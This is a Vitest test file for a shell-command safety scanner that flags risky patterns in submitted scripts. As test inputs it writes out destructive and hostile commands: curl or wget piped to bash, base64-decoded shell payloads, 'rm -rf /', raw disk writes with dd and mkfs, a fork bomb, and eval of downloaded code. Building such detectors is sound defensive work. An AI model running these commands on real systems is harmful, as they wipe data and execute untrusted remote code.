import { describe, expect, it } from "vitest";

import {
  REMOVE_PATTERN,
  CHMOD_PATTERN,
  MKFS_PATTERN,
  FORK_BOMB_PATTERN,
  INLINE_EVAL_PATTERN,
  SUDO_VALUE_FLAGS,
  SHELL_TOKENS,
  DOWNLOADER_TOKENS,
  ENV_VALUE_FLAGS,
  DANGEROUS_CHECKS,
  isWordCharacter,
  findCommandToken,
  hasCommandToken,
  pipeChainSegments,
  shellTokenEnd,
  shellToken,
  isEnvironmentAssignment,
  segmentLeadCommand,
  segmentHasDecodeFlag,
  hasPipeToShellInstall,
  hasBase64DecodedShell,
  scanDangerousShellPatterns,
} from "../packages/registry/src/command-safety-lib.js";

function lower(line: string) {
  return line.toLowerCase();
}

describe("constants", () => {
  it("exposes shell, downloader, and flag token sets", () => {
    expect(SHELL_TOKENS).toEqual(["bash", "zsh", "sh", "dash", "ash"]);
    expect(DOWNLOADER_TOKENS).toEqual(["curl", "wget"]);
    expect(SUDO_VALUE_FLAGS.has("-u")).toBe(true);
    expect(SUDO_VALUE_FLAGS.has("--user")).toBe(true);
    expect(SUDO_VALUE_FLAGS.has("--host")).toBe(true);
    expect(ENV_VALUE_FLAGS.has("--chdir")).toBe(true);
    expect(ENV_VALUE_FLAGS.has("--unset")).toBe(true);
    expect(DANGEROUS_CHECKS.map((entry) => entry.label)).toEqual([
      "pipe-to-shell install",
      "recursive force remove",
      "world-writable chmod",
      "raw disk write",
      "base64-decoded shell",
      "fork bomb",
      "inline eval of command substitution",
    ]);
  });

  it("matches destructive regex patterns", () => {
    expect(REMOVE_PATTERN.test("rm -rf /tmp")).toBe(true);
    expect(REMOVE_PATTERN.test("rm -fr /tmp")).toBe(true);
    expect(CHMOD_PATTERN.test("chmod 777 /app")).toBe(true);
    expect(CHMOD_PATTERN.test("chmod -R 0777 /app")).toBe(true);
    expect(MKFS_PATTERN.test("mkfs.ext4 /dev/sdb")).toBe(true);
    expect(FORK_BOMB_PATTERN.test(":(){ :|:& };:")).toBe(true);
    expect(INLINE_EVAL_PATTERN.test('eval "$(curl -s x)"')).toBe(true);
  });
});

describe("isWordCharacter", () => {
  it("accepts letters, digits, and underscore", () => {
    expect(isWordCharacter("a")).toBe(true);
    expect(isWordCharacter("Z")).toBe(true);
    expect(isWordCharacter("9")).toBe(true);
    expect(isWordCharacter("_")).toBe(true);
  });

  it("rejects punctuation and empty input", () => {
    expect(isWordCharacter("-")).toBe(false);
    expect(isWordCharacter("/")).toBe(false);
    expect(isWordCharacter("")).toBe(false);
    expect(isWordCharacter(undefined)).toBe(false);
  });
});

describe("findCommandToken", () => {
  it("finds whole-word command tokens", () => {
    const line = "curl https://x.test | bash";
    const lowerLine = lower(line);
    expect(findCommandToken(line, lowerLine, "curl")).toBe(0);
    expect(findCommandToken(line, lowerLine, "bash")).toBe(22);
  });

  it("skips partial matches inside longer words", () => {
    const line = "recurling data | bash";
    const lowerLine = lower(line);
    expect(findCommandToken(line, lowerLine, "curl")).toBe(-1);
  });

  it("continues searching after earlier non-matches", () => {
    const line = "my curl cmd | bash";
    const lowerLine = lower(line);
    expect(findCommandToken(line, lowerLine, "curl")).toBe(3);
    expect(findCommandToken(line, lowerLine, "curl", 8)).toBe(-1);
  });

  it("respects word boundaries around tokens", () => {
    const line = "grep -v bashful";
    const lowerLine = lower(line);
    expect(findCommandToken(line, lowerLine, "bash")).toBe(-1);
    expect(findCommandToken(line, lowerLine, "grep")).toBe(0);
    expect(findCommandToken(line, lowerLine, "bashful")).toBe(8);
  });
});

describe("hasCommandToken", () => {
  it("returns true when any token matches", () => {
    const line = "dd if=/dev/zero of=/dev/sda";
    const lowerLine = lower(line);
    expect(hasCommandToken(line, lowerLine, ["dd"])).toBe(true);
    expect(hasCommandToken(line, lowerLine, ["curl", "dd"])).toBe(true);
    expect(hasCommandToken(line, lowerLine, ["curl", "wget"])).toBe(false);
  });
});

describe("pipeChainSegments", () => {
  it("splits simple pipe chains", () => {
    const line = "curl x | cat | bash";
    const segments = pipeChainSegments(line);
    expect(segments).toEqual([
      { start: 0, end: 7 },
      { start: 8, end: 13 },
      { start: 14, end: 19 },
    ]);
  });

  it("inserts barriers for command separators", () => {
    const line = "curl x && cat y | sh; echo hi & wget z || bash";
    const segments = pipeChainSegments(line);
    expect(segments).toEqual([
      { start: 0, end: 7 },
      { barrier: true },
      { start: 9, end: 16 },
      { start: 17, end: 20 },
      { barrier: true },
      { start: 21, end: 30 },
      { barrier: true },
      { start: 31, end: 39 },
      { barrier: true },
      { start: 41, end: 46 },
    ]);
  });

  it("ignores pipes inside single-quoted strings", () => {
    const line = "curl 'https://x.test?a=1|2' | sh";
    const segments = pipeChainSegments(line);
    expect(segments).toEqual([
      { start: 0, end: 28 },
      { start: 29, end: 32 },
    ]);
  });

  it("ignores pipes inside double-quoted strings", () => {
    const line = 'curl "a|b" | sh';
    const segments = pipeChainSegments(line);
    expect(segments).toEqual([
      { start: 0, end: 11 },
      { start: 12, end: 15 },
    ]);
  });

  it("honors escaped pipes outside quotes", () => {
    const line = "curl x \\| sh";
    const segments = pipeChainSegments(line);
    expect(segments).toEqual([{ start: 0, end: 12 }]);
  });

  it("tracks escapes inside double quotes but not single quotes", () => {
    const line = 'echo "a\\" | b" | sh';
    const segments = pipeChainSegments(line);
    expect(segments).toEqual([
      { start: 0, end: 15 },
      { start: 16, end: 19 },
    ]);

    const singleQuoted = "echo 'a\\' | b' | sh";
    const singleSegments = pipeChainSegments(singleQuoted);
    expect(singleSegments).toEqual([
      { start: 0, end: 10 },
      { start: 11, end: 19 },
    ]);
  });

  it("handles a single segment with no separators", () => {
    expect(pipeChainSegments("npm test")).toEqual([{ start: 0, end: 8 }]);
    expect(pipeChainSegments("")).toEqual([{ start: 0, end: 0 }]);
  });
});

describe("shellToken helpers", () => {
  it("extracts the first token in a segment", () => {
    const line = "  HTTPS_PROXY=x curl https://x.test";
    const lowerLine = lower(line);
    expect(shellToken(line, lowerLine, 0, line.length)).toEqual({
      start: 2,
      end: 15,
      lower: "https_proxy=x",
    });
  });

  it("returns null for whitespace-only segments", () => {
    const line = "   ";
    expect(shellToken(line, lower(line), 0, line.length)).toBeNull();
  });

  it("stops the first token at whitespace even when quotes follow", () => {
    const line = 'curl "https://x.test?a=1 two" | sh';
    const lowerLine = lower(line);
    const end = shellTokenEnd(line, 0, 31);
    expect(line.slice(0, end)).toBe("curl");
    expect(shellToken(line, lowerLine, 0, 31)?.lower).toBe("curl");
  });

  it("walks escaped characters before the first whitespace", () => {
    const line = "curl\\ https://x.test";
    const end = shellTokenEnd(line, 0, line.length);
    expect(line.slice(0, end)).toBe("curl\\ https://x.test");
  });

  it("closes quoted segments while scanning shell token ends", () => {
    const line = '"hi" there';
    const end = shellTokenEnd(line, 0, line.length);
    expect(line.slice(0, end)).toBe('"hi"');
  });
});

describe("isEnvironmentAssignment", () => {
  it("recognizes POSIX variable assignments", () => {
    expect(isEnvironmentAssignment("HTTPS_PROXY=x")).toBe(true);
    expect(isEnvironmentAssignment("VAR_1=abc")).toBe(true);
    expect(isEnvironmentAssignment("1VAR=x")).toBe(false);
    expect(isEnvironmentAssignment("curl")).toBe(false);
    expect(isEnvironmentAssignment("=bad")).toBe(false);
  });
});

describe("segmentLeadCommand", () => {
  it("reads lead commands with leading assignments", () => {
    const line = "HTTPS_PROXY=http://p curl https://x.test | sh";
    const lowerLine = lower(line);
    const segment = pipeChainSegments(line)[0];
    expect(
      segmentLeadCommand(line, lowerLine, segment.start, segment.end),
    ).toBe("curl");
  });

  it("steps over sudo flags and value-taking options", () => {
    const line = "curl x | sudo -u root -E bash";
    const lowerLine = lower(line);
    const segment = pipeChainSegments(line)[1];
    expect(
      segmentLeadCommand(line, lowerLine, segment.start, segment.end),
    ).toBe("bash");
  });

  it("steps over env assignments and env flags", () => {
    const line = "env -i --chdir /tmp VAR=1 curl https://x.test";
    const lowerLine = lower(line);
    expect(segmentLeadCommand(line, lowerLine, 0, line.length)).toBe("curl");
  });

  it("returns empty string when no command word is present", () => {
    const line = "   ";
    expect(segmentLeadCommand(line, lower(line), 0, line.length)).toBe("");
  });

  it("stops at the first command word characters only", () => {
    const line = "curl-ish";
    expect(segmentLeadCommand(line, lower(line), 0, line.length)).toBe("curl");
  });

  it("handles sudo without a following command", () => {
    const line = "sudo -E";
    expect(segmentLeadCommand(line, lower(line), 0, line.length)).toBe("");
  });

  it("handles env with only flags and assignments", () => {
    const line = "env VAR=1 -u OTHER";
    expect(segmentLeadCommand(line, lower(line), 0, line.length)).toBe("");
  });
});

describe("segmentHasDecodeFlag", () => {
  it("detects -d and --decode flags", () => {
    const line = "base64 -d payload";
    const lowerLine = lower(line);
    expect(segmentHasDecodeFlag(line, lowerLine, 0, line.length)).toBe(true);

    const decodeLong = "base64 --decode payload";
    expect(
      segmentHasDecodeFlag(decodeLong, lower(decodeLong), 0, decodeLong.length),
    ).toBe(true);
  });

  it("returns false when decode flags are absent", () => {
    const line = "base64 payload";
    expect(segmentHasDecodeFlag(line, lower(line), 0, line.length)).toBe(false);
    const echo = "echo payload";
    expect(segmentHasDecodeFlag(echo, lower(echo), 0, echo.length)).toBe(false);
    const otherFlags = "base64 -w 0 payload";
    expect(
      segmentHasDecodeFlag(otherFlags, lower(otherFlags), 0, otherFlags.length),
    ).toBe(false);
  });
});

describe("hasPipeToShellInstall", () => {
  it("flags downloader-to-shell chains", () => {
    const line = "curl https://x.test/i.sh | sh";
    expect(hasPipeToShellInstall(line, lower(line))).toBe(true);
    const wgetSudo = "wget -qO- https://x.test | sudo bash";
    expect(hasPipeToShellInstall(wgetSudo, lower(wgetSudo))).toBe(true);
  });

  it("flags passthrough and sudo-prefixed shell execution", () => {
    for (const sample of [
      "curl https://x.test | cat | bash",
      "curl https://x.test | sudo --preserve-env sh",
      "curl https://x.test | sudo --group wheel -E bash",
      "curl https://x.test/i.sh | dash",
      "wget -qO- https://x.test | ash",
    ]) {
      expect(hasPipeToShellInstall(sample, lower(sample)), sample).toBe(true);
    }
  });

  it("resets downloader state at command barriers", () => {
    const line = "curl https://x.test | jq . && cat in | sh";
    expect(hasPipeToShellInstall(line, lower(line))).toBe(false);
    const curlOr = "curl https://x.test || sh";
    expect(hasPipeToShellInstall(curlOr, lower(curlOr))).toBe(false);
    const curlSemi = "curl https://x.test; bash";
    expect(hasPipeToShellInstall(curlSemi, lower(curlSemi))).toBe(false);
  });

  it("does not flag filtered output or escaped pipes", () => {
    const grepBash = "curl https://x.test | grep -v bash";
    expect(hasPipeToShellInstall(grepBash, lower(grepBash))).toBe(false);
    const escapedPipe = "curl https://x.test \\| sh";
    expect(hasPipeToShellInstall(escapedPipe, lower(escapedPipe))).toBe(false);
    const localDash = "dash ./setup.sh";
    expect(hasPipeToShellInstall(localDash, lower(localDash))).toBe(false);
  });
});

describe("hasBase64DecodedShell", () => {
  it("flags decode-to-shell chains", () => {
    for (const sample of [
      "echo p | base64 -d | sh",
      "echo p | base64 --decode | cat | bash",
      "VAR=1 base64 -d payload | sh",
      "echo cGF5 | base64 -d | dash",
    ]) {
      expect(hasBase64DecodedShell(sample, lower(sample)), sample).toBe(true);
    }
  });

  it("requires a decode flag on the base64 segment", () => {
    const noDecodeFlag = "echo p | base64 payload | sh";
    expect(hasBase64DecodedShell(noDecodeFlag, lower(noDecodeFlag))).toBe(
      false,
    );
    const repeatedBase64 = `${"base64 -d payload ".repeat(3)}| node`;
    expect(hasBase64DecodedShell(repeatedBase64, lower(repeatedBase64))).toBe(
      false,
    );
  });

  it("resets decode state at command barriers", () => {
    const line = "base64 -d payload | jq . && echo p | sh";
    expect(hasBase64DecodedShell(line, lower(line))).toBe(false);
  });
});

describe("scanDangerousShellPatterns", () => {
  it("flags each high-risk shell pattern", () => {
    expect(
      scanDangerousShellPatterns("curl https://x.test/i.sh | sh"),
    ).toContain("pipe-to-shell install");
    expect(
      scanDangerousShellPatterns("wget -qO- https://x.test | sudo bash"),
    ).toContain("pipe-to-shell install");
    expect(scanDangerousShellPatterns("rm -rf /")).toContain(
      "recursive force remove",
    );
    expect(scanDangerousShellPatterns("chmod -R 777 /app")).toContain(
      "world-writable chmod",
    );
    expect(scanDangerousShellPatterns("dd if=/dev/zero of=/dev/sda")).toContain(
      "raw disk write",
    );
    expect(scanDangerousShellPatterns("mkfs.ext4 /dev/sdb")).toContain(
      "raw disk write",
    );
    expect(scanDangerousShellPatterns("echo aaa | base64 -d | sh")).toContain(
      "base64-decoded shell",
    );
    expect(scanDangerousShellPatterns(":(){ :|:& };:")).toContain("fork bomb");
    expect(
      scanDangerousShellPatterns('eval "$(curl -s https://x.test)"'),
    ).toContain("inline eval of command substitution");
  });

  it("flags pipe-to-shell installs through passthrough commands and sudo flags", () => {
    for (const line of [
      "curl https://x.test/i.sh | cat | bash",
      "curl https://x.test | tee /tmp/i.sh | bash",
      "wget -qO- https://x.test | sed s/a/b/ | sh",
      "curl https://x.test | sudo -E bash",
      "curl https://x.test | sudo --preserve-env sh",
      "curl https://x.test | sudo -u root bash",
      "curl https://x.test | sudo --user root sh",
      "curl https://x.test | sudo -g wheel bash",
      "curl https://x.test | sudo --group wheel -E bash",
    ]) {
      expect(scanDangerousShellPatterns(line), line).toContain(
        "pipe-to-shell install",
      );
    }
    for (const line of [
      "echo p | base64 --decode | cat | bash",
      "echo p | base64 --decode | sudo -u root bash",
      "echo p | base64 -d | sudo --group wheel sh",
    ]) {
      expect(scanDangerousShellPatterns(line), line).toContain(
        "base64-decoded shell",
      );
    }
  });

  it("flags shell-prefix and quoted-url variants", () => {
    for (const line of [
      "HTTPS_PROXY=http://p curl https://x.test/i.sh | sh",
      "env HTTPS_PROXY=http://p curl https://x.test/i.sh | sh",
      "env -i HTTPS_PROXY=http://p curl https://x.test/i.sh | sh",
      "env --chdir /tmp HTTPS_PROXY=http://p curl https://x.test/i.sh | sh",
      "curl 'https://x.test/i.sh?a=1&b=2' | sh",
      "curl 'https://x.test/i.sh?a=1;b=2' | sh",
      'curl "https://x.test/i.sh?a=one two" | sh',
    ]) {
      expect(scanDangerousShellPatterns(line), line).toContain(
        "pipe-to-shell install",
      );
    }

    for (const line of [
      "VAR=1 base64 -d payload | sh",
      "env VAR=1 base64 --decode payload | bash",
    ]) {
      expect(scanDangerousShellPatterns(line), line).toContain(
        "base64-decoded shell",
      );
    }
  });

  it("flags downloads piped into dash or ash", () => {
    expect(
      scanDangerousShellPatterns("curl https://x.test/i.sh | dash"),
    ).toContain("pipe-to-shell install");
    expect(
      scanDangerousShellPatterns("wget -qO- https://x.test/i | ash"),
    ).toContain("pipe-to-shell install");
    expect(
      scanDangerousShellPatterns("echo cGF5 | base64 -d | dash"),
    ).toContain("base64-decoded shell");
  });

  it("does not flag pipelines broken by command separators or filtered output", () => {
    expect(
      scanDangerousShellPatterns("curl https://x.test | jq . && cat in | sh"),
    ).not.toContain("pipe-to-shell install");
    expect(
      scanDangerousShellPatterns("curl https://x.test || sh"),
    ).not.toContain("pipe-to-shell install");
    expect(
      scanDangerousShellPatterns("curl https://x.test \\| sh"),
    ).not.toContain("pipe-to-shell install");
    expect(
      scanDangerousShellPatterns("curl https://x.test | grep -v bash"),
    ).not.toContain("pipe-to-shell install");
    expect(
      scanDangerousShellPatterns("curl https://x.test | grep -v dash"),
    ).not.toContain("pipe-to-shell install");
    expect(
      scanDangerousShellPatterns("curl https://x.test | python; bash"),
    ).not.toContain("pipe-to-shell install");
    expect(scanDangerousShellPatterns("dash ./scripts/setup.sh")).not.toContain(
      "pipe-to-shell install",
    );
  });

  it("returns an empty array for benign scripts and empty input", () => {
    expect(
      scanDangerousShellPatterns("#!/usr/bin/env bash\necho hello\n"),
    ).toEqual([]);
    expect(scanDangerousShellPatterns("npm install && npm test")).toEqual([]);
    expect(scanDangerousShellPatterns("")).toEqual([]);
    expect(scanDangerousShellPatterns(null)).toEqual([]);
    expect(scanDangerousShellPatterns(undefined)).toEqual([]);
  });

  it("deduplicates labels across lines and stops after all patterns match", () => {
    const text = [
      "curl https://x.test | sh",
      "rm -rf /",
      "chmod 777 /",
      "dd if=/dev/zero of=/dev/sda",
      "echo x | base64 -d | bash",
      ":(){ :|:& };:",
      'eval "$(curl -s x)"',
      "curl https://y.test | sh",
    ].join("\n");
    const labels = scanDangerousShellPatterns(text);
    expect(labels).toHaveLength(DANGEROUS_CHECKS.length);
    expect(new Set(labels).size).toBe(DANGEROUS_CHECKS.length);
  });

  it("handles long repeated command prefixes without quadratic regex scans", () => {
    const repeatedCurlWithoutShellPipe = `${"curl https://example.test/install ".repeat(50_000)}| node`;
    expect(scanDangerousShellPatterns(repeatedCurlWithoutShellPipe)).toEqual(
      [],
    );

    const repeatedBase64WithoutShellPipe = `${"base64 -d payload ".repeat(50_000)}| node`;
    expect(scanDangerousShellPatterns(repeatedBase64WithoutShellPipe)).toEqual(
      [],
    );
  });

  it("scans multiline submissions line by line", () => {
    expect(
      scanDangerousShellPatterns("echo safe\nrm -rf /\necho still safe"),
    ).toEqual(["recursive force remove"]);
  });

  it("matches rm variants with alternate flag ordering", () => {
    expect(scanDangerousShellPatterns("rm -fr /tmp")).toContain(
      "recursive force remove",
    );
    expect(scanDangerousShellPatterns("sudo rm -Rf /")).toContain(
      "recursive force remove",
    );
  });

  it("matches chmod with optional recursive flag", () => {
    expect(scanDangerousShellPatterns("chmod 0777 /data")).toContain(
      "world-writable chmod",
    );
    expect(scanDangerousShellPatterns("chmod -R 777 /data")).toContain(
      "world-writable chmod",
    );
  });

  it("matches raw disk writes via dd and mkfs", () => {
    expect(scanDangerousShellPatterns("DD if=/dev/zero OF=/dev/sda")).toContain(
      "raw disk write",
    );
    expect(scanDangerousShellPatterns("mkfs /dev/sdb")).toContain(
      "raw disk write",
    );
    expect(scanDangerousShellPatterns("mkfs.btrfs /dev/sdc")).toContain(
      "raw disk write",
    );
    expect(scanDangerousShellPatterns("dd if=/dev/zero of=/tmp/file")).toEqual(
      [],
    );
  });

  it("matches inline eval patterns with alternate quoting", () => {
    expect(scanDangerousShellPatterns("eval `$(curl -s x)`")).toContain(
      "inline eval of command substitution",
    );
    expect(scanDangerousShellPatterns("eval '$(wget -qO- x)'")).toContain(
      "inline eval of command substitution",
    );
  });
});

describe("dangerous check helpers", () => {
  it("exposes callable tests for each label", () => {
    for (const { label, test } of DANGEROUS_CHECKS) {
      expect(typeof test).toBe("function");
      expect(label.length).toBeGreaterThan(0);
    }

    const pipeCheck = DANGEROUS_CHECKS.find(
      (entry) => entry.label === "pipe-to-shell install",
    );
    expect(pipeCheck?.test("curl x | sh", "curl x | sh")).toBe(true);

    const chmodCheck = DANGEROUS_CHECKS.find(
      (entry) => entry.label === "world-writable chmod",
    );
    expect(chmodCheck?.test("chmod 777 /", "chmod 777 /")).toBe(true);
  });
});
